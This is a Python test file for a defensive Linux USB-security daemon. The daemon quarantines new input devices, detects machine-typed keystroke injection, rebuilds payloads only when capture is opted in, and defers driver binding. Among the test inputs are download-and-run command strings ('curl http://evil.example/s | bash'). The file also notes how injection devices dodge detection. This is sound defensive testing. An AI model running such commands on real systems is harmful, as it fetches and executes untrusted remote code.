"""
Stage 3: behaviour under EVIOCGRAB quarantine, payload reconstruction and
its privacy invariants, and deferred driver binding.

Covers probolos.quarantine, probolos.payload and probolos.deferred_bind.
"""

from __future__ import annotations

import io
import os
import struct
import sys
import time
import types
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from probolos import analyzers, daemon, deferred_bind, payload, quarantine, rules, sysfs


def obs_with(intervals_ms, start_ms=800.0, **kwargs):
    """Build an Observation whose key presses follow the given gaps."""
    t = start_ms / 1000.0
    presses = [quarantine.KeyPress(timestamp=t, code=30)]
    for gap in intervals_ms:
        t += gap / 1000.0
        presses.append(quarantine.KeyPress(timestamp=t, code=30))
    return quarantine.Observation(
        duration=3.0, race_window=0.012,
        nodes=["/dev/input/event20"], grabbed=["/dev/input/event20"],
        key_presses=presses, **kwargs)


# Codes used below, from linux/input-event-codes.h

K = {"h": 35, "e": 18, "l": 38, "o": 24, "space": 57, "enter": 28,
     "lshift": 42, "meta": 125, "r": 19, "c": 46, "ctrl": 29,
     "u": 22, "1": 2, "esc": 1}


PRESS, RELEASE = 1, 0


def ev(*items):
    """Build (offset, code, value) triples with plausible timing."""
    return [(0.1 * i, code, value) for i, (code, value) in enumerate(items)]


def typed(word):
    """Press and release each letter of a lowercase word."""
    out = []
    for ch in word:
        out += [(K[ch], PRESS), (K[ch], RELEASE)]
    return out


class FakeBackend:
    """Records privileged writes instead of performing them."""

    supports_bus_wide = True

    def __init__(self, tree: Path, device: Path, create_on_authorize=()):
        self.tree = tree
        self.device = device
        self.create_on_authorize = list(create_on_authorize)
        self.autoprobe_writes = []
        self.interface_writes = []
        self.probes = []
        self.device_authorized = None

    # -- the bus-wide pair --------------------------------------------------
    def set_drivers_autoprobe(self, value):
        self.autoprobe_writes.append(value)
        (self.tree / "drivers_autoprobe").write_text(str(value))

    def trigger_driver_probe(self, name):
        self.probes.append(name)

    # -- per-device ---------------------------------------------------------
    def authorize(self, syspath, value):
        self.device_authorized = value
        if value == 1:
            # The kernel creates the interface directories inside
            # usb_set_configuration(), which runs only now. Reproducing that
            # ordering is the entire point of this fake.
            for name in self.create_on_authorize:
                d = self.device.parent / name
                d.mkdir(exist_ok=True)
                (d / "authorized").write_text("1")

    def authorize_interface(self, intf_dir, value):
        self.interface_writes.append((Path(intf_dir).name, value))
        (Path(intf_dir) / "authorized").write_text(str(value))

    def set_default(self, hub, value):
        pass


# ---------------------------------------------------------------------------
# Reconstruction itself
# ---------------------------------------------------------------------------

def _press(code, offset=0.0):
    return (offset, code, 1)


def _release(code, offset=0.0):
    return (offset, code, 0)


def _stub_pyudev():
    """quarantine.available() needs the module present; nothing else does."""
    mod = types.ModuleType("pyudev")

    class _Mon:
        @staticmethod
        def from_netlink(ctx):
            return _Mon()

        def filter_by(self, **kwargs):
            pass

        def start(self):
            pass

        def poll(self, timeout=None):
            return None

    mod.Context = type("Context", (), {})
    mod.Monitor = _Mon
    return mod


class TestSilentDevices(unittest.TestCase):

    def test_a_keyboard_nobody_touches_is_silent(self):
        obs = quarantine.Observation(
            duration=3.0, race_window=0.011,
            nodes=["/dev/input/event20"], grabbed=["/dev/input/event20"])
        self.assertEqual(rules.behaviour_findings(obs), [])

    def test_mouse_movement_and_clicks_are_not_typing(self):
        """
        A mouse jiggled during quarantine produces motion and button events.
        Neither is a keystroke and neither may raise a finding.
        """
        obs = quarantine.Observation(
            duration=3.0, race_window=0.009,
            nodes=["/dev/input/event5"], grabbed=["/dev/input/event5"],
            motion_events=340, button_presses=4)
        self.assertEqual(rules.behaviour_findings(obs), [])

    def test_button_codes_are_classified_as_buttons(self):
        self.assertTrue(quarantine.is_keyboard_key(30))     # KEY_A
        self.assertFalse(quarantine.is_keyboard_key(272))   # BTN_LEFT
        self.assertFalse(quarantine.is_keyboard_key(274))   # BTN_MIDDLE
        self.assertTrue(quarantine.is_keyboard_key(352))    # KEY_OK


class TestInjectionDetection(unittest.TestCase):

    def test_scripted_payload_is_critical(self):
        """A Ducky-style payload: fast and metronomic."""
        obs = obs_with([8, 8, 9, 8, 8, 9, 8, 8, 8, 9], start_ms=300)
        findings = rules.behaviour_findings(obs)
        ids = [f.rule_id for f in findings]

        self.assertIn("machine-generated-keystrokes", ids)
        self.assertIn("immediate-activity", ids)
        self.assertEqual(rules.worst(findings), rules.Severity.CRITICAL)

    def test_slow_but_metronomic_payload_still_caught_as_unprompted(self):
        """
        A payload deliberately throttled to human speed defeats the timing
        test. It cannot defeat the fact that nobody was touching the device.
        """
        obs = obs_with([140, 155, 148, 160, 143, 151, 139])
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]

        self.assertNotIn("machine-generated-keystrokes", ids)
        self.assertIn("unprompted-typing", ids)

    def test_human_typing_is_not_called_machine_generated(self):
        """Real typing is irregular even when quick."""
        obs = obs_with([95, 210, 60, 175, 130, 88, 260, 110])
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]
        self.assertNotIn("machine-generated-keystrokes", ids)

    def test_accidental_brush_is_only_a_warning(self):
        obs = obs_with([300, 900])
        findings = rules.behaviour_findings(obs)

        self.assertEqual([f.rule_id for f in findings], ["unexpected-keystrokes"])
        self.assertEqual(rules.worst(findings), rules.Severity.WARNING)

    def test_fast_but_only_two_keys_is_not_critical(self):
        """Two samples cannot establish a rhythm. Do not overclaim."""
        obs = obs_with([9])
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]
        self.assertNotIn("machine-generated-keystrokes", ids)


class TestObservationIntegrity(unittest.TestCase):

    def test_failed_isolation_is_reported(self):
        obs = quarantine.Observation(
            duration=3.0, race_window=0.010,
            nodes=["/dev/input/event20", "/dev/input/event21"],
            grabbed=["/dev/input/event20"])
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]
        self.assertIn("incomplete-isolation", ids)

    def test_missing_evdev_is_stated_not_hidden(self):
        obs = quarantine.Observation(error="python-evdev is required")
        findings = rules.behaviour_findings(obs)

        self.assertEqual([f.rule_id for f in findings], ["quarantine-unavailable"])
        # Absence of evidence must not be reported as evidence of absence.
        self.assertNotEqual(rules.worst(findings), rules.Severity.INFO)

    def test_race_window_is_always_disclosed(self):
        obs = quarantine.Observation(
            race_window=0.014, nodes=["/dev/input/event20"],
            grabbed=["/dev/input/event20"])
        note = rules.race_window_note(obs)
        self.assertIsNotNone(note)
        self.assertIn("14 ms", note)

    def test_no_race_note_when_nothing_was_isolated(self):
        self.assertIsNone(rules.race_window_note(quarantine.Observation()))


class TestStatistics(unittest.TestCase):

    def test_regularity_is_independent_of_speed(self):
        """
        The discriminating statistic must not simply track speed: a slow
        metronome and a fast metronome are equally inhuman.
        """
        fast = rules._coefficient_of_variation([0.008] * 6)
        slow = rules._coefficient_of_variation([0.400] * 6)
        self.assertAlmostEqual(fast, 0.0, places=6)
        self.assertAlmostEqual(slow, 0.0, places=6)

    def test_single_interval_yields_no_statistic(self):
        self.assertIsNone(rules._coefficient_of_variation([0.1]))


class TestInputNodeDiscovery(unittest.TestCase):
    """
    The bug that hid itself: find_input_nodes compared the bus-view USB path
    (/sys/bus/usb/devices/3-1, a symlink) against udev's already-resolved
    sys_path (/sys/devices/pci.../3-1/...). They never matched, so quarantine
    found no nodes and reported "nothing to observe" for every real device --
    an absence of evidence that looked like evidence of absence.
    """

    def test_bus_view_path_matches_resolved_udev_paths(self):
        import tempfile
        from pathlib import Path
        from unittest import mock

        from probolos import quarantine

        with tempfile.TemporaryDirectory() as tmp:
            real = Path(tmp) / "devices" / "pci0000:00" / "3-1"
            (real / "3-1:1.0" / "input" / "input25" / "event5").mkdir(parents=True)
            busdir = Path(tmp) / "bus" / "usb" / "devices"
            busdir.mkdir(parents=True)
            (busdir / "3-1").symlink_to(real)

            class FakeUdevDevice:
                def __init__(self, node, sys_path):
                    self.device_node = node
                    self.sys_path = sys_path

            class FakeContext:
                def list_devices(self, subsystem=None):
                    return [
                        FakeUdevDevice(
                            "/dev/input/event5",
                            str(real / "3-1:1.0" / "input" / "input25" / "event5")),
                        # an unrelated device that must NOT match
                        FakeUdevDevice("/dev/input/event0",
                                       str(Path(tmp) / "devices" / "platform" / "i8042")),
                    ]

            with mock.patch.object(quarantine, "pyudev", object()):
                found = quarantine.find_input_nodes(busdir / "3-1",
                                                    context=FakeContext())

            self.assertEqual(found, ["/dev/input/event5"],
                             "bus-view path must match resolved udev sys_paths")

    def test_unrelated_devices_are_not_claimed(self):
        """
        Grabbing the wrong node would capture the user's real keyboard and lock
        them out of their own machine, so the ancestry test must be strict.
        """
        import tempfile
        from pathlib import Path
        from unittest import mock

        from probolos import quarantine

        with tempfile.TemporaryDirectory() as tmp:
            ours = Path(tmp) / "devices" / "usb1" / "1-1"
            ours.mkdir(parents=True)
            theirs = Path(tmp) / "devices" / "usb1" / "1-2" / "input" / "event9"
            theirs.mkdir(parents=True)

            class FakeUdevDevice:
                device_node = "/dev/input/event9"
                sys_path = str(theirs)

            class FakeContext:
                def list_devices(self, subsystem=None):
                    return [FakeUdevDevice()]

            with mock.patch.object(quarantine, "pyudev", object()):
                found = quarantine.find_input_nodes(ours, context=FakeContext())

            self.assertEqual(found, [])


class TestNoLiveWindowAfterObservation(unittest.TestCase):
    """
    Found by running it: after the observation window ended, the grab was
    released but the device stayed authorized while the human read the report.
    A malicious keyboard could stay silent for the three seconds and then type
    freely during the prompt -- defeating quarantine by simply waiting.

    The device must be blocked again the instant observation ends, and only
    authorized if the human approves.
    """

    def test_device_is_reblocked_before_the_prompt(self):
        from pathlib import Path
        from unittest import mock

        from probolos import daemon as daemon_mod
        from probolos import quarantine, sysfs, usbclass

        dev = mock.Mock(spec=sysfs.UsbDevice)
        dev.name = "1-4"
        dev.syspath = Path("/sys/bus/usb/devices/1-4")
        dev.kinds = [usbclass.KIND_INPUT]
        dev.is_root_hub = False
        dev.claims = ["KEYBOARD"]
        dev.vendor_id, dev.product_id = "1234", "5678"
        dev.label.return_value = "Test Keyboard"

        engine = daemon_mod.Probolos(observe=1.0)
        calls = []

        obs = quarantine.Observation(duration=1.0, race_window=0.01,
                                     nodes=["/dev/input/event9"],
                                     grabbed=["/dev/input/event9"])

        with mock.patch.object(daemon_mod.sysfs, "set_authorized",
                               side_effect=lambda p, v: calls.append(v)), \
             mock.patch.object(engine, "_quarantine", return_value=obs), \
             mock.patch.object(engine, "_ask", return_value=False), \
             mock.patch.object(engine, "_load_with_retry", return_value=dev), \
             mock.patch.object(daemon_mod.report, "render", return_value=""), \
             mock.patch.object(daemon_mod.report, "render_behaviour",
                               return_value=""), \
             mock.patch.object(daemon_mod.report, "one_liner", return_value=""):
            engine._on_add("/sys/bus/usb/devices/1-4")

        # First write after observation must be 0 (re-block), never 1.
        self.assertTrue(calls, "no authorization writes were made")
        self.assertEqual(calls[0], 0,
                         "device must be re-blocked immediately after "
                         "observation, before the human is asked")


class TestReconstruction(unittest.TestCase):

    def test_plain_text_is_recovered(self):
        result = payload.reconstruct(ev(*typed("hello")))
        self.assertEqual(result.lines, ["STRING hello"])
        self.assertEqual(result.keystrokes, 5)

    def test_shift_produces_capitals(self):
        """Shift is held across the H, then released before the e."""
        events = ev((K["lshift"], PRESS), (K["h"], PRESS), (K["h"], RELEASE),
                    (K["lshift"], RELEASE), (K["e"], PRESS), (K["e"], RELEASE))
        self.assertEqual(payload.reconstruct(events).lines, ["STRING He"])

    def test_named_keys_break_the_text_run(self):
        result = payload.reconstruct(ev(*typed("hello"),
                                        (K["enter"], PRESS),
                                        (K["enter"], RELEASE)))
        self.assertEqual(result.lines, ["STRING hello", "ENTER"])

    def test_chords_are_reported_as_actions(self):
        """GUI+r is the opening move of most Windows payloads."""
        events = ev((K["meta"], PRESS), (K["r"], PRESS), (K["r"], RELEASE),
                    (K["meta"], RELEASE))
        self.assertEqual(payload.reconstruct(events).lines, ["GUI R"])

    def test_auto_repeat_is_not_counted_as_typing(self):
        """value 2 means a key is held, not struck again."""
        events = [(0.0, K["h"], PRESS), (0.1, K["h"], 2), (0.2, K["h"], 2),
                  (0.3, K["h"], RELEASE)]
        result = payload.reconstruct(events)
        self.assertEqual(result.keystrokes, 1)
        self.assertEqual(result.lines, ["STRING h"])

    def test_modifiers_are_not_counted_as_keystrokes(self):
        events = ev((K["lshift"], PRESS), (K["lshift"], RELEASE))
        self.assertEqual(payload.reconstruct(events).keystrokes, 0)

    def test_long_payloads_are_truncated_and_say_so(self):
        result = payload.reconstruct(ev(*typed("hello" * 400)), max_chars=64)
        self.assertTrue(result.truncated)

    def test_suspicious_tokens_are_surfaced(self):
        """
        The point of extraction: not 'a device was blocked' but 'the device
        tried to run this'.
        """
        result = payload.Payload(text="curl http://evil.example/s | bash")
        tokens = result.suspicious_tokens()
        self.assertIn("curl", tokens)
        self.assertIn("http://", tokens)

    def test_ordinary_text_has_no_suspicious_tokens(self):
        self.assertEqual(payload.Payload(text="hello there").suspicious_tokens(), [])


class TestCaptureIsOptIn(unittest.TestCase):

    def test_default_observation_stores_no_key_content(self):
        """
        The privacy guarantee, as an assertion rather than a promise: with
        capture off, no key identity exists anywhere -- not on disk, not in
        memory.
        """
        obs = quarantine.Observation(capture=False)
        obs.key_presses.append(quarantine.KeyPress(timestamp=0.4))
        self.assertIsNone(obs.key_presses[0].code)
        self.assertEqual(obs.raw_events, [])
        self.assertIsNone(payload.reconstruct_observation(obs))

    def test_timing_analysis_still_works_without_key_content(self):
        """Stage 3 must not depend on knowing WHICH keys were pressed."""
        obs = quarantine.Observation(capture=False, duration=3.0,
                                     nodes=["/dev/input/event20"],
                                     grabbed=["/dev/input/event20"])
        t = 0.3
        for _ in range(10):
            obs.key_presses.append(quarantine.KeyPress(timestamp=t))
            t += 0.008
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]
        self.assertIn("machine-generated-keystrokes", ids)

    def test_capture_enabled_reconstructs(self):
        obs = quarantine.Observation(capture=True)
        obs.raw_events = ev(*typed("hello"))
        recovered = payload.reconstruct_observation(obs)
        self.assertEqual(recovered.lines, ["STRING hello"])

    def test_payload_analyzer_is_silent_without_capture(self):
        obs = quarantine.Observation(capture=False)
        result = analyzers.PayloadAnalyzer().analyze(
            analyzers.Context(device=None, observation=obs))
        self.assertEqual(result, [])

    def test_payload_analyzer_reports_when_capture_is_on(self):
        obs = quarantine.Observation(capture=True)
        obs.raw_events = ev(*typed("hello"))
        findings = analyzers.PayloadAnalyzer().analyze(
            analyzers.Context(device=None, observation=obs))
        self.assertEqual([f.rule_id for f in findings], ["payload-captured"])
        self.assertEqual(rules.worst(findings), rules.Severity.CRITICAL)


class DeferredBindTests(unittest.TestCase):

    def setUp(self):
        self._tmp = TemporaryDirectory()
        self.tree = Path(self._tmp.name)
        self.device = self.tree / "3-1"
        self.device.mkdir()
        (self.device / "authorized").write_text("0")
        (self.tree / "drivers_autoprobe").write_text("1")
        (self.tree / "drivers_probe").write_text("")

        self._saved = (sysfs.DRIVERS_AUTOPROBE, sysfs.DRIVERS_PROBE,
                       sysfs._backend)
        sysfs.DRIVERS_AUTOPROBE = self.tree / "drivers_autoprobe"
        sysfs.DRIVERS_PROBE = self.tree / "drivers_probe"
        self.backend = FakeBackend(self.tree, self.device,
                                   create_on_authorize=["3-1:1.0", "3-1:1.1"])
        sysfs.install_backend(self.backend)
        deferred_bind._autoprobe_original = None

    def tearDown(self):
        sysfs.DRIVERS_AUTOPROBE, sysfs.DRIVERS_PROBE, backend = self._saved
        sysfs.install_backend(backend)
        deferred_bind._autoprobe_original = None
        self._tmp.cleanup()

    # ------------------------------------------------------------------
    # The bug itself
    # ------------------------------------------------------------------

    def test_a_blocked_device_has_no_interface_directories(self):
        """The kernel fact the old implementation was built on top of, wrongly.

        If this ever starts failing, the premise of this whole module changed
        and deferred_bind should be revisited -- so it is asserted, not assumed.
        """
        self.assertEqual(deferred_bind.interface_dirs(self.device), [])

    def test_capability_is_not_decided_by_counting_interfaces(self):
        """The regression guard.

        The old check was `len(interface_dirs(path)) > 0`, evaluated while the
        device was blocked. Since the directories do not exist yet, it returned
        False on every device forever, and the daemon silently took the racy
        path. supported() must answer from the BUS, which is available.
        """
        self.assertEqual(deferred_bind.interface_dirs(self.device), [])
        self.assertTrue(deferred_bind.supported(self.device))

    # ------------------------------------------------------------------
    # The mechanism
    # ------------------------------------------------------------------

    def test_autoprobe_is_off_only_across_the_authorize(self):
        with deferred_bind.DeferredBind(self.device, log=lambda _m: None) as db:
            self.assertEqual(self.backend.autoprobe_writes, [0])
            db.authorize_device()
            # Restored as soon as the device is up: the bus-wide exposure must
            # not last for the observation window.
            self.assertEqual(self.backend.autoprobe_writes, [0, 1])
            self.assertEqual(
                (self.tree / "drivers_autoprobe").read_text(), "1")

    def test_interfaces_are_closed_after_authorization_not_before(self):
        with deferred_bind.DeferredBind(self.device, log=lambda _m: None) as db:
            self.assertEqual(self.backend.interface_writes, [])
            db.authorize_device()
            self.assertEqual(
                sorted(self.backend.interface_writes),
                [("3-1:1.0", 0), ("3-1:1.1", 0)])

    def test_release_authorizes_and_then_forces_a_probe(self):
        """Authorizing an interface does not rebind on its own.

        interface_authorized_store() sets the flag and stops; without the write
        to drivers_probe, usbhid never attaches and no evdev node appears -- the
        device would be admitted and then be silently dead.
        """
        with deferred_bind.DeferredBind(self.device, log=lambda _m: None) as db:
            db.authorize_device()
            self.backend.interface_writes.clear()
            db.release_interfaces()

        self.assertEqual(sorted(self.backend.interface_writes),
                         [("3-1:1.0", 1), ("3-1:1.1", 1)])
        self.assertEqual(sorted(self.backend.probes), ["3-1:1.0", "3-1:1.1"])

    # ------------------------------------------------------------------
    # Fail-safes
    # ------------------------------------------------------------------

    def test_autoprobe_is_restored_when_authorization_raises(self):
        """A machine that binds no drivers is worse than one dead device."""
        def explode(_syspath, _value):
            raise OSError("device vanished")
        self.backend.authorize = explode

        with self.assertRaises(OSError):
            with deferred_bind.DeferredBind(self.device,
                                            log=lambda _m: None) as db:
                db.authorize_device()

        self.assertEqual((self.tree / "drivers_autoprobe").read_text(), "1")

    def test_emergency_restore_works_without_the_object(self):
        """Signal handlers and atexit have no DeferredBind to call."""
        db = deferred_bind.DeferredBind(self.device, log=lambda _m: None)
        db.__enter__()
        self.assertEqual((self.tree / "drivers_autoprobe").read_text(), "0")
        deferred_bind.emergency_restore()
        self.assertEqual((self.tree / "drivers_autoprobe").read_text(), "1")

    def test_emergency_restore_is_idempotent(self):
        deferred_bind.emergency_restore()
        deferred_bind.emergency_restore()
        self.assertEqual((self.tree / "drivers_autoprobe").read_text(), "1")

    def test_original_value_is_preserved_not_assumed(self):
        """Some systems run with autoprobe already at 0. Restoring 1 would be
        a silent configuration change made by a security tool."""
        (self.tree / "drivers_autoprobe").write_text("0")
        with deferred_bind.DeferredBind(self.device, log=lambda _m: None) as db:
            db.authorize_device()
        self.assertEqual((self.tree / "drivers_autoprobe").read_text(), "0")

    def test_interfaces_left_closed_are_reopened_on_exit(self):
        db = deferred_bind.DeferredBind(self.device, log=lambda _m: None)
        with db:
            db.authorize_device()
            # release_interfaces() deliberately not called: simulates an
            # exception between authorization and release.
        self.assertEqual(sorted(self.backend.interface_writes)[-2:],
                         [("3-1:1.1", 0), ("3-1:1.1", 1)])
        for name in ("3-1:1.0", "3-1:1.1"):
            self.assertEqual(
                (self.tree / name / "authorized").read_text(), "1")

    # ------------------------------------------------------------------
    # Privilege separation
    # ------------------------------------------------------------------

    def test_unsupported_when_the_backend_refuses_bus_wide_writes(self):
        """Under --privsep the gate cannot scope a bus-wide operation.

        supported() must say no BEFORE anything is written, otherwise the
        mechanism gets halfway through with autoprobe already at 0 and then
        discovers it cannot finish.
        """
        class Scoped(FakeBackend):
            supports_bus_wide = False

        sysfs.install_backend(Scoped(self.tree, self.device))
        self.assertFalse(deferred_bind.supported(self.device))
        self.assertIn("privsep", deferred_bind.unsupported_reason())

    def test_unsupported_when_the_kernel_lacks_autoprobe(self):
        sysfs.DRIVERS_AUTOPROBE = self.tree / "does-not-exist"
        self.assertFalse(deferred_bind.supported(self.device))
        self.assertIn("not readable", deferred_bind.unsupported_reason())


# ---------------------------------------------------------------------------
# 3. Key identity is discarded unless capture was requested
# ---------------------------------------------------------------------------

class DefaultConfigurationRecordsNoKeyIdentity(unittest.TestCase):

    def _observe(self, capture):
        obs = quarantine.Observation(capture=capture)
        for code in (30, 31, 32):        # a, s, d
            quarantine._record_event(quarantine.EV_KEY, code, 1, obs, 0.0)
        return obs

    def test_a_keypress_carries_a_timestamp_and_nothing_else(self):
        obs = self._observe(capture=False)
        self.assertEqual(len(obs.key_presses), 3)
        for press in obs.key_presses:
            self.assertIsNone(
                press.code,
                "the default configuration recorded WHICH key was pressed")

    def test_no_raw_event_stream_is_kept_without_capture(self):
        self.assertEqual(self._observe(capture=False).raw_events, [])

    def test_nothing_can_be_reconstructed_without_capture(self):
        self.assertIsNone(
            payload.reconstruct_observation(self._observe(capture=False)))

    def test_timing_analysis_still_works_without_capture(self):
        """
        The constraint must not be bought by disabling the stage. Timestamps
        alone are what the behavioural rules read.
        """
        obs = self._observe(capture=False)
        self.assertEqual(len(obs.intervals()), 2)
        self.assertIsNotNone(obs.time_to_first_key())

    def test_capture_is_opt_in_and_then_records_the_keys(self):
        obs = self._observe(capture=True)
        self.assertEqual([p.code for p in obs.key_presses], [30, 31, 32])
        recovered = payload.reconstruct_observation(obs)
        self.assertIsNotNone(recovered)
        self.assertEqual(recovered.text, "asd")

    def test_capture_is_off_unless_the_flag_is_given(self):
        """
        The default is the invariant, so it is read off the real parser rather
        than off the help text, which wraps.
        """
        from probolos import __main__ as entry
        with mock.patch.object(entry, "require_usb"), \
             mock.patch.object(entry, "require_root"), \
             mock.patch.object(entry.daemon, "serve") as serve, \
             mock.patch.object(entry.sys, "stdout", new=io.StringIO()):
            entry.main(["--dry-run", "--no-ledger", "--no-trust"])
        self.assertIs(serve.call_args.kwargs["capture_payload"], False)

    def test_the_daemon_defaults_to_not_capturing(self):
        self.assertFalse(daemon.Probolos().capture_payload)


# ---------------------------------------------------------------------------
# 1. Devices present at startup are baseline and never inspected
# ---------------------------------------------------------------------------

class BaselineDevicesAreNeverInspected(unittest.TestCase):

    def test_a_device_in_the_baseline_is_dropped_before_anything_reads_it(self):
        engine = daemon.Probolos(observe=3.0, capture_payload=True)
        engine.known.add("1-4")
        with mock.patch.object(daemon.Probolos, "_load_with_retry") as load, \
             mock.patch.object(daemon.Probolos, "_quarantine") as quarantined:
            engine._on_add("/sys/bus/usb/devices/1-4")
        load.assert_not_called()
        quarantined.assert_not_called()

    def test_snapshot_puts_every_live_device_in_the_baseline(self):
        live = mock.Mock(name="live", authorized=1, is_root_hub=False)
        live.name = "1-4"
        with mock.patch.object(daemon.sysfs, "list_devices",
                               return_value=[live]):
            engine = daemon.Probolos()
            engine.snapshot()
        self.assertIn("1-4", engine.known)
        self.assertEqual(engine.pending, {})


# ---------------------------------------------------------------------------
# 2. Quarantine runs before the decision, and the grab is never retaken
# ---------------------------------------------------------------------------

class QuarantineRunsOnlyBeforeTheDecision(unittest.TestCase):

    def test_the_device_is_re_blocked_before_any_grab_is_released(self):
        """
        Ordering, not merely presence: releasing first would leave a window in
        which the device is live and ungrabbed, which is the one state in
        which it could type into the session it was being observed for.
        """
        import inspect
        source = inspect.getsource(quarantine.quarantine)
        deauthorize = source.index("deauthorize()")
        ungrab = source.index("_ungrab(fd)")
        self.assertLess(deauthorize, ungrab)

    def test_an_authorized_device_is_never_offered_to_the_quarantine(self):
        """
        _on_add returns at the baseline check for anything already admitted,
        and admission adds the device to that baseline. So there is no route
        from "authorized" back into _quarantine.
        """
        engine = daemon.Probolos(observe=3.0, capture_payload=True)
        engine.known.add("1-4")
        with mock.patch.object(daemon.Probolos, "_quarantine") as quarantined:
            engine._on_add("/sys/bus/usb/devices/1-4")
        quarantined.assert_not_called()

    def test_observe_zero_disables_the_stage_entirely(self):
        engine = daemon.Probolos(observe=0.0)
        self.assertEqual(engine.observe, 0.0)


class Reconstruction(unittest.TestCase):

    def test_a_shifted_run_reads_as_typed(self):
        events = [_press(payload.MOD_LEFTSHIFT), _press(35), _press(23),
                  _release(payload.MOD_LEFTSHIFT), _press(23)]
        self.assertEqual(payload.reconstruct(events).text, "HIi")

    def test_a_chord_becomes_an_action_line(self):
        events = [_press(payload.MOD_LEFTMETA), _press(19),
                  _release(payload.MOD_LEFTMETA)]
        self.assertEqual(payload.reconstruct(events).lines, ["GUI R"])

    def test_auto_repeat_is_not_counted_as_a_second_keystroke(self):
        events = [_press(30), (0.0, 30, 2), (0.0, 30, 2)]
        self.assertEqual(payload.reconstruct(events).keystrokes, 1)

    def test_the_character_cap_cannot_be_reset_by_pressing_enter(self):
        """
        The bound compared max_chars against a buffer that flush() emptied, so
        a payload typing a newline every few characters never reached it.
        """
        events = []
        for _ in range(500):
            events += [_press(30), _press(31), _press(28)]   # "as" ENTER
        recovered = payload.reconstruct(events, max_chars=64)
        self.assertTrue(recovered.truncated)
        self.assertLess(len(recovered.as_script()), 4096)

    def test_the_keystroke_count_survives_truncation(self):
        events = [_press(30)] * 200
        recovered = payload.reconstruct(events, max_chars=8)
        self.assertEqual(recovered.keystrokes, 200)
        self.assertTrue(recovered.truncated)

    def test_a_download_and_run_payload_is_named_as_one(self):
        text = "curl http://x.example/s | bash"
        codes = {c: k for k, (c, _s) in payload.KEYMAP.items()}
        events = [_press(codes[ch]) for ch in text if ch in codes]
        tokens = payload.reconstruct(events).suspicious_tokens()
        self.assertIn("curl", tokens)
        self.assertIn("bash", tokens)

    def test_an_unmapped_code_is_reported_rather_than_dropped(self):
        self.assertEqual(payload.reconstruct([_press(200)]).lines, ["KEY_200"])


# ---------------------------------------------------------------------------
# 3. Payload reconstruction: the character cap was resettable
# ---------------------------------------------------------------------------

class PayloadBound(unittest.TestCase):
    """
    The cap compared max_chars against payload.text (empty until the last line
    of the function) plus the CURRENT buffer -- which flush() emptied. Pressing
    ENTER reset it, so a hostile HID typing newlines was never bounded at all.
    """

    def test_cap_is_not_reset_by_flushing_a_line(self):
        events = []
        for _ in range(2000):
            events += [(0.0, 30, 1), (0.0, 30, 0),      # 'a'
                       (0.0, 28, 1), (0.0, 28, 0)]      # ENTER
        recovered = payload.reconstruct(events, max_chars=10)
        self.assertTrue(recovered.truncated)
        self.assertLess(len(recovered.lines), 30)

    def test_keystroke_count_is_still_complete(self):
        """How much it typed is a finding; only the transcript is bounded."""
        events = []
        for _ in range(500):
            events += [(0.0, 30, 1), (0.0, 30, 0)]
        recovered = payload.reconstruct(events, max_chars=10)
        self.assertEqual(recovered.keystrokes, 500)
        self.assertTrue(recovered.truncated)

    def test_short_payloads_are_untouched(self):
        events = [(0.0, 38, 1), (0.0, 38, 0),           # 'l'
                  (0.0, 31, 1), (0.0, 31, 0)]           # 's'
        recovered = payload.reconstruct(events)
        self.assertFalse(recovered.truncated)
        self.assertEqual(recovered.text, "ls")


class ReblockFailureDoesNotKillTheDaemon(unittest.TestCase):
    """
    The device is pulled out during the observation window.

    `deauthorize()` then returns ENODEV. It ran inside quarantine()'s `finally`
    with nothing catching it, so the OSError travelled up through _quarantine()
    and _on_add() into the udev poll loop, which has no handler either. The
    daemon exited on an unplug.
    """

    def setUp(self):
        sys.modules.setdefault("pyudev", _stub_pyudev())
        from probolos import quarantine
        self.quarantine = quarantine
        quarantine.pyudev = sys.modules["pyudev"]
        self._real_find = quarantine.find_input_nodes
        quarantine.find_input_nodes = lambda path, ctx=None: []

    def tearDown(self):
        self.quarantine.find_input_nodes = self._real_find

    def test_enodev_on_reblock_is_reported_not_raised(self):
        def deauthorize():
            raise OSError(19, "No such device")

        obs = self.quarantine.quarantine(
            Path("/sys/bus/usb/devices/1-4"),
            authorize_fn=lambda: None,
            duration=0.05, settle_timeout=0.05,
            deauthorize_fn=deauthorize)

        self.assertIsNotNone(obs.reblock_error)
        self.assertIn("No such device", obs.reblock_error)

    def test_a_failed_reblock_becomes_a_critical_finding(self):
        """
        Reporting it is not enough on its own. Every other behavioural finding
        is read on the assumption that the device is off again while the human
        decides; if the re-block failed that assumption is false, and a NOTICE
        buried under the timing statistics would not say so.
        """
        from probolos import rules

        obs = self.quarantine.Observation(duration=1.0)
        obs.reblock_error = "[Errno 16] Device or resource busy"
        findings = rules.behaviour_findings(obs)
        critical = [f for f in findings
                    if f.rule_id == "quarantine-not-restored"]
        self.assertEqual(len(critical), 1)
        self.assertEqual(critical[0].severity, rules.Severity.CRITICAL)


class DeferredBindFailurePutsInterfacesBack(unittest.TestCase):
    """
    The exception path threw away the list of interfaces it had switched off.

    Those interfaces stay at authorized=0 in the kernel. A device the user
    later approves then comes up dead, with nothing left in the process to say
    which interfaces to restore or why they are off.
    """

    def test_interfaces_are_restored_and_cleanup_errors_do_not_mask(self):
        from probolos import deferred_bind, sysfs

        restored = []
        calls = []

        class FakeBackend:
            supports_bus_wide = True

            def authorize(self, syspath, value):
                calls.append((str(syspath), value))
                raise OSError(19, "No such device")   # cleanup itself fails

            def authorize_interface(self, intf, value):
                restored.append((intf.name, value))

            def trigger_driver_probe(self, name):
                pass

            def set_drivers_autoprobe(self, value):
                pass

        real_backend = sysfs._backend
        sysfs._backend = FakeBackend()
        try:
            db = deferred_bind.DeferredBind(
                Path("/sys/bus/usb/devices/1-4"), log=lambda *a: None)
            db._device_authorized = True
            db._holding_autoprobe = False
            db._deauthorized = [Path("/sys/bus/usb/devices/1-4:1.0")]

            original = ValueError("the real failure")
            # __exit__ must report False (do not swallow) and must not raise
            # its own cleanup error over the caller's exception.
            swallowed = db.__exit__(ValueError, original, None)
        finally:
            sysfs._backend = real_backend

        self.assertFalse(swallowed)
        self.assertEqual(restored, [("1-4:1.0", 1)])
        self.assertEqual(db._deauthorized, [])


class QuarantineLifetime(unittest.TestCase):
    def setUp(self):
